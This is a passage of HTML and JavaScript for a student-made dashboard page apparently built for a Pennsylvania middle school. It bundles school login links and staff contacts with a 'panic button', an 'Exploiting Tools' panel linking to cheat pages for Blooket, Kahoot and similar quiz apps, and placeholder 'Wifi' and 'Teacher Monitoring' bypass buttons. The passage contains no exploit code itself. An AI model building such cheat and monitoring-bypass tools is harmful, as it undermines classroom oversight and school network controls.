                    <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank" class="action-button">Barracuda</a>
                    <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank" class="action-button">Buy Guernsey</a>
                    <a href="https://middletownsd.instructure.com/login/ldap" target="_blank" class="action-button">Canvas (Teacher)</a>
                    <a href="https://caresolace.com/site/middletownarea" target="_blank" class="action-button">Care Solace</a>
                    <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" class="action-button">Clever (Teacher)</a>
                    <a href="https://www.discoveryeducation.com" target="_blank" class="action-button">Discovery Education</a>
                    <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" class="action-button">EasyBridge (Teacher)</a>
                    <a href="https://raiderweb.gofmx.com/login" target="_blank" class="action-button">FMX</a>
                    <a href="https://myhealthyzone.fitnessgram.net" target="_blank" class="action-button">FitnessGram</a>
                    <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank" class="action-button">Frontline</a>
                    <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" class="action-button">LinkIt! (Teacher)</a>
                    <a href="https://id.naviance.com" target="_blank" class="action-button">Naviance</a>
                    <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" class="action-button">Destiny Library</a>
                    <a href="https://paetep.edulinksolutions.com/login" target="_blank" class="action-button">PA eTEP</a>
                    <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank" class="action-button">PowerSchool (Teacher)</a>
                    <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" class="action-button">Scholastic</a>
                    <a href="https://go.schoolmessenger.com/#/home" target="_blank" class="action-button">SchoolMessenger</a>
                    <a href="https://www.pdesas.org/standard/" target="_blank" class="action-button">PDE SAS</a>
                    <a href="https://www.pbisapps.org" target="_blank" class="action-button">PBIS Apps</a>
                    <a href="https://masd.happyfox.com/home/" target="_blank" class="action-button">HappyFox</a>
                    <a href="https://middletownasd-pa.safeschools.com/login" target="_blank" class="action-button">SafeSchools</a>
                    <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank" class="action-button">Office 365</a>
                </div>
            </div>

            <!-- Phone Directory Panel -->
            <div id="phoneDirectoryPanel" class="info-panel">
                <h2 id="phoneDirectoryPanelTitle">☎️ School Phone Directory Information</h2>
                <div class="coming-soon">
                    Update Coming Soon!
                </div>
            </div>

            <!-- Camera Panel -->
            <div id="cameraPanel" class="info-panel">
                <h2 id="cameraPanelTitle">📹 School Camera Information</h2>
                <div class="coming-soon">
                    Update Coming Soon
                </div>
            </div>

            <!-- School Info Panel -->
            <div id="schoolInfoPanel" class="info-panel">
                <h2 id="schoolInfoPanelTitle">🏢 School Information</h2>
                <div class="school-info-grid">
                    <div class="school-info-item">
                        <div class="school-info-label">School Name:</div>
                        <div>Middletown Area Middle School</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">School Address:</div>
                        <div>215 Oberlin Road Middletown, PA 17057</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">School Phone:</div>
                        <div>717-930-0739</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">School Fax:</div>
                        <div>717-944-0591</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">School Principal:</div>
                        <div>Dr. Shannon L. Wevodau</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">Principal's Phone:</div>
                        <div>717-930-0739</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">Principal's Email:</div>
                        <div>swevodau@raiderweb.org</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">Assistant Principal:</div>
                        <div>Mr. Michael DeFilippo</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">Assistant Principal's Phone:</div>
                        <div>717-930-0739</div>
                    </div>
                    <div class="school-info-item">
                        <div class="school-info-label">Assistant Principal's Email:</div>
                        <div>mdefilippo@raiderweb.org</div>
                    </div>
                </div>
            </div>

            <!-- Exploit Panel -->
            <div id="exploitPanel" class="info-panel">
                <h2 id="exploitPanelTitle">💣 Exploiting Tools</h2>
                <div class="exploit-buttons">
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Blooket Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Kahoot Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Gimkit Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Quizlet Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Quizzes Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Quills Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Edpuzzle Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Nearpod Exploit</a>
                </div>
            </div>

            <!-- Bypass Panel -->
            <div id="bypassPanel" class="info-panel">
                <h2 id="bypassPanelTitle">🔑 Bypassing Tools</h2>
                <div class="bypass-buttons">
                    <button class="action-button red" onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
                    <button class="action-button red" onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
                    <button class="action-button red" onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
                    <button class="action-button red" onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
                    <button class="action-button red" onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
                    <button class="action-button red" onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
                </div>

                <div id="bathroomBypass" class="bypass-content">
                    <p>COMING SOON</p>
                </div>

                <div id="wifiBypass" class="bypass-content">
                    <p>Go to School Wifi Information</p>
                </div>

                <div id="monitoringBypass" class="bypass-content">
                    <p>COMING SOON</p>
                </div>

                <div id="coming1Bypass" class="bypass-content">
                    <p>COMING SOON</p>
                </div>

                <div id="coming2Bypass" class="bypass-content">
                    <p>COMING SOON</p>
                </div>

                <div id="coming3Bypass" class="bypass-content">
                    <p>COMING SOON</p>
                </div>
            </div>

            <!-- VPN Panel -->
            <div id="vpnPanel" class="info-panel">
                <h2 id="vpnPanelTitle">🛡️ VPN Websites</h2>
                <div class="links-list">
                    <a href="https://example-vpn1.com" target="_blank" class="action-button">VPN Service 1</a>
                    <a href="https://example-vpn2.com" target="_blank" class="action-button">VPN Service 2</a>
                    <a href="https://example-vpn3.com" target="_blank" class="action-button">VPN Service 3</a>
                    <a href="https://example-vpn4.com" target="_blank" class="action-button">VPN Service 4</a>
                </div>
            </div>

            <!-- Gaming Panel -->
            <div id="gamingPanel" class="info-panel">
                <h2 id="gamingPanelTitle">🎮 Gaming Websites</h2>
                <div class="coming-soon">
                    COMING SOON
                </div>
            </div>

            <!-- Music Panel -->
            <div id="musicPanel" class="info-panel">
                <h2 id="musicPanelTitle">🎧 Music Websites</h2>
                <div class="coming-soon">
                    COMING SOON
                </div>
            </div>

            <!-- Keyboard Panel -->
            <div id="keyboardPanel" class="info-panel">
                <h2 id="keyboardPanelTitle">⌨️ Keyboard Tricks</h2>
                <div class="info-text">
                    <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.

Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.

Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.

General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
                </div>
            </div>
        </div>

        <div id="canvasContainer">
            <h2>🖌️ Notes Canvas</h2>
            <canvas id="notesCanvas" width="800" height="500"></canvas>
            <div id="canvasControls">
                <button id="clearCanvasBtn" class="action-button red">Clear Canvas</button>
                <button id="closeCanvasBtn" class="action-button blue">Close Notes</button>
            </div>
        </div>
    </div>

    <script>
        // Dashboard functionality object
        const dashboard = {
            activePanel: null,
            init: function() {
                this.initSessionTimer();
                this.initClock();
                this.generateCalendar();
                this.initThemeToggle();
                this.initButtons();
                this.initCanvas();
                this.initPanels();
                this.initReminders(); // Initialize reminders
                this.initSettings(); // Initialize settings
                this.initCalculator(); // Initialize calculator
                this.initUnitConverter(); // Initialize converter
                this.initWeatherWidget(); // Initialize weather
                this.initTodoApp(); // Initialize to-do list
                this.initPasswordGenerator(); // Initialize password generator
                this.initTerminal(); // Initialize terminal
                this.initMediaPlayer(); // Initialize media player
            },

            // Utility for notifications
            showNotification: function(message, duration = 3000) {
                const container = document.getElementById('notificationContainer');
                const notification = document.createElement('div');
                notification.classList.add('notification');
                notification.textContent = message;
                container.appendChild(notification);

                const autoHide = localStorage.getItem('autoHideNotifications') !== 'false';
                const notificationDisplayDuration = parseInt(localStorage.getItem('notificationDuration') || '3', 10) * 1000;

                setTimeout(() => {
                    notification.classList.add('fade-out');
                    notification.addEventListener('animationend', () => {
                        notification.remove();
                    });
                }, autoHide ? notificationDisplayDuration : duration);

                // Update usage stats
                let clicks = parseInt(localStorage.getItem('stats_clicks') || '0');
                localStorage.setItem('stats_clicks', clicks + 1);
                this.updateStatsDisplay();
            },

            // Updates specific CSS variables for themes and custom colors
            applyCustomStyles: function() {
                const root = document.documentElement;

                // Set primary theme colors as CSS variables
                if (document.body.classList.contains('light-theme')) {
                    root.style.setProperty('--main-bg', '#f0f0f0');
                    root.style.setProperty('--main-text-color', '#333');
                    root.style.setProperty('--box-bg-dark', '#fcfcfc'); // Boxes become light
                    root.style.setProperty('--item-bg-alt-dark', '#eee');
                    root.style.setProperty('--panel-bg-dark', '#fcfcfc'); // Panels become light
                    root.style.setProperty('--heading-color-dark', '#994d00'); // headings adjust to dark text on light theme

                } else { // Dark theme
                    root.style.setProperty('--main-bg', '#1a1a1a');
                    root.style.setProperty('--main-text-color', '#e0e0e0');
                    root.style.setProperty('--box-bg-dark', '#2a2a2a');
                    root.style.setProperty('--item-bg-alt-dark', '#3b3b3b');
                    root.style.setProperty('--panel-bg-dark', '#2a2a2a');
                    root.style.setProperty('--heading-color-dark', '#ffbf80');
                }

                // Custom accent color - always override after theme specific
                const accentColor = localStorage.getItem('accentColor') || '#ff914d';
                root.style.setProperty('--accent-color', accentColor);
                // Dynamically calculate a lighter shade for hover and end gradient for accents
                root.style.setProperty('--accent-color-light-hover', this.lightenColor(accentColor, 20)); // For buttons
                root.style.setProperty('--accent-color-hover-shadow', this.lightenColor(accentColor, 20, true)); // Shadow with transparency
                root.style.setProperty('--header-start-color', accentColor);
                root.style.setProperty('--header-end-color', this.lightenColor(accentColor, 30));

                // Directly apply background color to dashboardHeader if it's customized (not using CSS var cascade)
                const headerBgCustom = localStorage.getItem('headerBgColor') || accentColor; // Default to accent if not explicitly set
                document.getElementById('dashboardHeader').style.background = `linear-gradient(90deg, ${headerBgCustom}, ${this.lightenColor(headerBgCustom, 30)})`;

                // General color adjustments to ensure dynamic accent applies where appropriate
                document.querySelectorAll('.dashboard-buttons-container button, .dashboard-buttons-container a').forEach(btn => {
                    if (!btn.classList.contains('red') && !btn.classList.contains('green') && !btn.classList.contains('blue')) {
                        btn.style.backgroundColor = accentColor;
                    }
                });
                document.querySelectorAll('.info-panel h2').forEach(h2 => h2.style.color = accentColor);
                document.querySelectorAll('.box h2').forEach(h2 => {
                  if (document.body.classList.contains('light-theme')) {
                    h2.style.color = 'var(--heading-color-light)';
                  } else {
                    h2.style.color = this.lightenColor(accentColor, 15);
                  }
                });

                document.getElementById('loginBox').style.borderColor = accentColor;
                document.getElementById('loginBox').style.boxShadow = `0 0 20px ${this.lightenColor(accentColor, 20, true)}`;

                document.querySelectorAll('.box').forEach(box => {
                    if(!box.classList.contains('motivation-box')) {
                         box.style.boxShadow = `0 0 18px ${this.lightenColor(accentColor, 20, true)}`;
                         box.style.backgroundColor = document.body.classList.contains('light-theme') ? 'var(--box-bg-light)' : 'var(--box-bg-dark)';
                    }
                });
                document.querySelectorAll('.info-panel').forEach(panel => {
                    panel.style.boxShadow = `0 0 20px ${this.lightenColor(accentColor, 20, true)}`;
                    panel.style.backgroundColor = document.body.classList.contains('light-theme') ? 'var(--panel-bg-light)' : 'var(--panel-bg-dark)';
                });
            },

            // Helper to lighten/darken a hex color and optionally add transparency to it
            lightenColor: function(hex, percent, addAlpha = false) {
                let f=parseInt(hex.slice(1),16),t=percent<0?0:255,p=percent<0?percent*-1:percent,R=f>>16,G=(f>>8)&0x00ff,B=f&0x0000ff;
                let newR = Math.round((t-R)*p/100)+R;
                let newG = Math.round((t-G)*p/100)+G;
                let newB = Math.round((t-B)*p/100)+B;
                
                if (addAlpha) {
                    let alpha = 0.5; // Example transparency
                    if (percent > 0) alpha = Math.min(0.8, percent / 100 + 0.3); // More opaque if lightening
                    else alpha = Math.max(0.2, 1 - (percent * -1) / 100); // Less opaque if darkening
                    return `rgba(${newR}, ${newG}, ${newB}, ${alpha})`;
                }
                return "#"+(0x1000000 + newR*0x10000 + newG*0x100 + newB).toString(16).slice(1);
            },


            // Initialize session timer
            initSessionTimer: function() {
                let sessionSeconds = 0;
                function formatTime(seconds) {
                    const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
                    const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
                    const secs = String(seconds % 60).padStart(2, '0');
                    return `${hrs}:${mins}:${secs}`;
                }

                function updateSessionTime() {
                    sessionSeconds++;
                    document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
                    // Update stats
                    document.getElementById('statsUptime') && (document.getElementById('statsUptime').innerText = formatTime(sessionSeconds));
                }

                updateSessionTime();
                setInterval(updateSessionTime, 1000);
            },

            // Initialize real-time clock
            initClock: function() {
                function updateClock() {
                    const now = new Date();
                    const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
                    const timeStr = now.toLocaleTimeString(undefined, options);
                    const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

                    document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
                    document.getElementById('realDate').innerText = '📅 ' + dateStr;
                }

                updateClock();
                setInterval(updateClock, 1000);
            },

            // Generate calendar
            generateCalendar: function() {
                const calendar = document.getElementById('calendar');
                calendar.innerHTML = '';
                const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
                days.forEach(day => {
                    const div = document.createElement('div');
                    div.innerText = day;
                    calendar.appendChild(div);
                });

                const date = new Date();
                const year = date.getFullYear();
                const month = date.getMonth();
                const today = date.getDate();

                const firstDay = new Date(year, month, 1).getDay();
                const lastDate = new Date(year, month + 1, 0).getDate();

                for (let i = 0; i < firstDay; i++) {
                    const empty = document.createElement('div');
                    calendar.appendChild(empty);
                }

                for (let i = 1; i <= lastDate; i++) {
                    const cell = document.createElement('div');
                    cell.innerText = i;
                    if (i === today) cell.classList.add('today');
                    calendar.appendChild(cell);
                }
            },

            // Initialize theme toggle
            initThemeToggle: function() {
                const themeBtn = document.getElementById('themeToggle');
                themeBtn.addEventListener('click', () => {
                    const isLightTheme = document.body.classList.toggle('light-theme');
                    localStorage.setItem('theme', isLightTheme ? 'light' : 'dark');
                    document.getElementById('themeSelector').value = isLightTheme ? 'light' : 'dark'; // Update settings panel
                    themeBtn.innerText = isLightTheme ? '☀️ Light Mode' : '🌙 Dark Mode';
                    this.applyCustomStyles();
                    this.showNotification(`Theme toggled to ${isLightTheme ? 'Light' : 'Dark'}.`);

                    let toggles = parseInt(localStorage.getItem('stats_theme_toggles') || '0');
                    localStorage.setItem('stats_theme_toggles', toggles + 1);
                    this.updateStatsDisplay();
                });

                // Apply saved theme on load
                const savedTheme = localStorage.getItem('theme');
                if (savedTheme === 'light') {
                    document.body.classList.add('light-theme');
                    themeBtn.innerText = '☀️ Light Mode';
                } else {
                    document.body.classList.remove('light-theme'); // Ensure dark theme is default if not explicitly light
                    themeBtn.innerText = '🌙 Dark Mode';
                }
                this.applyCustomStyles(); // Apply initial custom styles
            },

            // Initialize main buttons
            initButtons: function() {
                document.getElementById('panicBtn').addEventListener('click', () => {
                    window.open('https://clever.com', '_blank');
                    this.showNotification('🚨 Panic button pressed!');
                });

                document.getElementById('restartBtn').addEventListener('click', () => {
                    if(confirm('Are you sure you want to kill the page (restart)?')) {
                        document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
                    }
                    this.showNotification('🔄 Page restart initiated.');
                });

                document.getElementById('fixIssuesBtn').addEventListener('click', () => {
                    alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
                    this.showNotification('⚙️ Fix Issues button pressed.');
                });

                document.getElementById('fullScreenBtn').addEventListener('click', () => {
                    if (!document.fullscreenElement) {
                        document.documentElement.requestFullscreen().catch(err => {
                            alert(`Error attempting to enable full-screen mode: ${err.message}`);
                        });
                        this.showNotification('💻 Fullscreen mode enabled.');
                    } else {
                        document.exitFullscreen();
                        this.showNotification('💻 Fullscreen mode disabled.');
                    }
                });

                let zoomLevel = 1;
                const zoomStep = 0.1;
                const minZoom = 0.5;
                const maxZoom = 2;

                document.getElementById('zoomInBtn').addEventListener('click', () => {
                    if (zoomLevel < maxZoom) {
                        zoomLevel += zoomStep;
                        document.body.style.zoom = zoomLevel;
                        this.showNotification(`➕ Zoom In (${Math.round(zoomLevel * 100)}%)`);
                    }
                });

                document.getElementById('zoomOutBtn').addEventListener('click', () => {
                    if (zoomLevel > minZoom) {
                        zoomLevel -= zoomStep;
                        document.body.style.zoom = zoomLevel;
                        this.showNotification(`➖ Zoom Out (${Math.round(zoomLevel * 100)}%)`);
                    }
                });

                document.getElementById('logoutBtn').addEventListener('click', () => {
                    if (confirm('Are you sure you want to log out?')) {
                        location.reload(); // Simple reload for logout, can be more complex
                        this.showNotification('👋 Logged out.');
                    }
                });

                // Attach notification to settings button
                document.getElementById('settingsBtn').addEventListener('click', () => {
                    this.togglePanel('settingsPanel');
                    this.showNotification('🛠️ Settings panel opened.');
                });
            },

            // Initialize canvas for notes
            initCanvas: function() {
                const notesBtn = document.getElementById('notesBtn');
                const canvasContainer = document.getElementById('canvasContainer');
                const mainGrid = document.getElementById('mainGrid');
                const updatesNotifications = document.getElementById('updatesNotifications');

                notesBtn.addEventListener('click', () => {
                    mainGrid.style.display = 'none';
                    updatesNotifications.style.display = 'none';
                    canvasContainer.style.display = 'block';
                    this.showNotification('📝 Notes canvas opened.');

                    let canvasUsed = parseInt(localStorage.getItem('stats_canvas_used') || '0');
                    localStorage.setItem('stats_canvas_used', canvasUsed + 1);
                    this.updateStatsDisplay();
                });

                document.getElementById('closeCanvasBtn').addEventListener('click', () => {
                    canvasContainer.style.display = 'none';
                    mainGrid.style.display = 'flex';
                    updatesNotifications.style.display = 'flex';
                    this.showNotification('📝 Notes canvas closed.');
                });

                const clearCanvasBtn = document.getElementById('clearCanvasBtn');

                const canvas = document.getElementById('notesCanvas');
                const ctx = canvas.getContext('2d');

                // Load saved notes from localStorage
                const savedNotes = localStorage.getItem('notesCanvasData');
                if (savedNotes) {
                    const img = new Image();
                    img.onload = () => {
                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height); // Draw to fit canvas
                    };
                    img.src = savedNotes;
                } else {
                    ctx.fillStyle = '#fff';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                }

                let drawing = false;

                function getPos(evt) {
                    const rect = canvas.getBoundingClientRect();
                    return {
                        x: (evt.clientX || evt.touches[0].clientX) - rect.left,
                        y: (evt.clientY || evt.touches[0].clientY) - rect.top
                    };
                }

                canvas.addEventListener('mousedown', (e) => {
                    drawing = true;
                    const pos = getPos(e);
                    ctx.beginPath();
                    ctx.moveTo(pos.x, pos.y);
                    e.preventDefault();
                });

                canvas.addEventListener('touchstart', (e) => {
                    drawing = true;
                    const pos = getPos(e);
                    ctx.beginPath();
                    ctx.moveTo(pos.x, pos.y);
                    e.preventDefault();
                });

                canvas.addEventListener('mousemove', (e) => {
                    if (!drawing) return;
                    const pos = getPos(e);
                    ctx.lineTo(pos.x, pos.y);
                    ctx.strokeStyle = localStorage.getItem('accentColor') || '#ff914d'; // Use accent color for drawing
                    ctx.lineWidth = 3; // Thicker line
                    ctx.lineCap = 'round';
                    ctx.lineJoin = 'round';
                    ctx.stroke();
                    e.preventDefault();
                });

                canvas.addEventListener('touchmove', (e) => {
                    if (!drawing) return;
                    const pos = getPos(e);
                    ctx.lineTo(pos.x, pos.y);
                    ctx.strokeStyle = localStorage.getItem('accentColor') || '#ff914d';
                    ctx.lineWidth = 3;
                    ctx.lineCap = 'round';
                    ctx.lineJoin = 'round';
                    ctx.stroke();
                    e.preventDefault();
                });

                ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
                    canvas.addEventListener(evtName, () => {
                        drawing = false;
                        // Save notes immediately after drawing stops
                        localStorage.setItem('notesCanvasData', canvas.toDataURL());
                    });
                });

                clearCanvasBtn.addEventListener('click', () => {
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.fillStyle = '#fff';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    localStorage.removeItem('notesCanvasData'); // Clear saved data
                    this.showNotification('🎨 Notes canvas cleared.');
                });

                document.getElementById('screenshotBtn').addEventListener('click', () => {
                    const elementToCapture = document.body;
                    html2canvas(elementToCapture).then(canvasImg => {
                        const link = document.createElement('a');
                        link.download = 'dashboard_screenshot.png';
                        link.href = canvasImg.toDataURL('image/png');
                        link.click();
                        this.showNotification('📸 Screenshot taken!');
                    });
                });

                document.getElementById('exportNotesBtn').addEventListener('click', () => {
                    const link = document.createElement('a');
                    link.download = 'notes_canvas.png';
                    link.href = canvas.toDataURL('image/png');
                    link.click();
                    this.showNotification('💾 Notes exported as image.');
                });

                const toggleBtn = document.getElementById('toggleSectionsBtn');
                toggleBtn.addEventListener('click', () => {
                    if (mainGrid.style.display === 'none' || mainGrid.style.display === '') {
                        mainGrid.style.display = 'flex';
                        updatesNotifications.style.display = 'flex'; // Ensure it's shown too
                        toggleBtn.innerHTML = '↔️ Toggle Sections';
                    } else {
                        mainGrid.style.display = 'none';
                        updatesNotifications.style.display = 'none'; // Ensure it's hidden too
                        toggleBtn.innerHTML = '↔️ Toggle Sections'; // Text could be '⬇️ Hide Sections'
                    }
                    this.showNotification('↔️ Sections toggled.');
                });
            },

            // Initialize panels state
            initPanels: function() {
                document.querySelectorAll('.info-panel').forEach(panel => {
                    panel.style.display = 'none';
                });
                document.querySelectorAll('.ipad-content').forEach(content => {
                    content.style.display = 'none';
                });
                document.querySelectorAll('.bypass-content').forEach(content => {
                    content.style.display = 'none';
                });
            },

            // Panel toggle function (centralized)
            togglePanel: function(panelId) {
                const panel = document.getElementById(panelId);
                const notificationMessage = panel.querySelector('h2').textContent.trim() + ' toggled.';
                this.showNotification(notificationMessage);

                // Close previously active panel if different from current
                if (this.activePanel && this.activePanel.id !== panelId) {
                    this.activePanel.style.display = 'none';
                }

                if (panel.style.display === 'none' || panel.style.display === '') {
                    panel.style.display = 'block';
                    this.activePanel = panel;
                } else {
                    panel.style.display = 'none';
                    this.activePanel = null;
                }
            },

            showIpadContent: function(contentId) {
                document.querySelectorAll('.ipad-content').forEach(content => {
                    content.style.display = 'none';
                });
                document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
                this.showNotification(`📱 iPad ${contentId} information displayed.`);
            },

            showBypassContent: function(contentId) {
                document.querySelectorAll('.bypass-content').forEach(content => {
                    content.style.display = 'none';
                });
                document.getElementById(contentId + 'Bypass').style.display = 'block';
                this.showNotification(`🔑 Bypass ${contentId} information displayed.`);
            },

            // --- Reminder System Functions ---
            reminders: [],
            initReminders: function() {
                const addReminderBtn = document.getElementById('addReminderBtn');
                const reminderText = document.getElementById('reminderText');
                const reminderDate = document.getElementById('reminderDate');
                const reminderTime = document.getElementById('reminderTime');
                const remindersList = document.getElementById('remindersList');
                const clearAllRemindersBtn = document.getElementById('clearAllRemindersBtn');

                // Load reminders from LocalStorage
                this.loadReminders();

                // Display reminders
                this.renderReminders();

                addReminderBtn.addEventListener('click', () => {
                    const text = reminderText.value.trim();
                    const date = reminderDate.value;
                    const time = reminderTime.value;

                    if (text && date && time) {
                        const newReminder = {
                            id: Date.now(),
                            text,
                            date,
                            time,
                            timestamp: new Date(`${date}T${time}`).getTime(),
                            completed: false
                        };
                        this.reminders.push(newReminder);
                        this.saveReminders();
                        this.renderReminders();
                        reminderText.value = '';
                        reminderDate.value = '';
                        reminderTime.value = '';
                        this.showNotification(`⏰ Reminder "${text}" added.`);

                        let remindersSet = parseInt(localStorage.getItem('stats_reminders_set') || '0');
                        localStorage.setItem('stats_reminders_set', remindersSet + 1);
                        this.updateStatsDisplay();
                    } else {
                        this.showNotification('❗️ Please fill all reminder fields.', 5000);
                    }
                });

                clearAllRemindersBtn.addEventListener('click', () => {
                    if (confirm('Are you sure you want to delete all reminders?')) {
                        this.reminders = [];
                        this.saveReminders();
                        this.renderReminders();
                        this.showNotification('⏰ All reminders cleared.');
                    }
                });

                // Periodically check for reminders (every minute)
                setInterval(() => {
                    this.reminders.forEach(r => {
                        if (!r.completed && r.timestamp < Date.now() && !r.notified) {
                            this.showNotification(`🔔 Reminder Alert: "${r.text}"!`, 10000);
                            r.notified = true; // Mark as notified to prevent repeated alerts
                            this.saveReminders();
                            // Optional: play a sound if enabled in settings
                            if (localStorage.getItem('reminderSound') === 'true') {
                                new Audio('https://www.soundjay.com/buttons/beep-07.mp3').play().catch(e => console.error("Sound play failed", e)); // Placeholder sound
                            }
                            if (Notification.permission === "granted" && localStorage.getItem('desktopNotifications') === 'true') {
                                new Notification("Private Dashboard Reminder", {
                                    body: r.text,
